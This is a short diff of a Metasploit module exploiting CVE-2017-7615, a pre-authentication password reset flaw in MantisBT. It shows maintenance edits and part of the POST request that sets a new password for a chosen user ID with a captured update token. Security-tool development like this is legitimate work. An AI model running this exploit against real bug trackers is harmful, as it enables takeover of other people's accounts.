@@ -23,10 +23,9 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2017-7615'],
           ['EDB', '41890'],
           ['URL', 'https://mantisbt.org/bugs/view.php?id=22690']
-                    ['URL', 'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt']
+          ['URL', 'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt']
         ],
       'Platform'     => ['win', 'linux'],
-      'Privileged'   => false,
       'DisclosureDate' => "Apr 16, 2017"))
 
       register_options(
@@ -93,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_post' => {
           'verify_user_id' => datastore['USERID'],
           'account_update_token' => $1,
-          'realname' => 'jvoisin',
+          'realname' => Rex::Text.rand_text_alpha(rand(5) + 8),
           'password' => password,
           'password_confirm' => password
         },
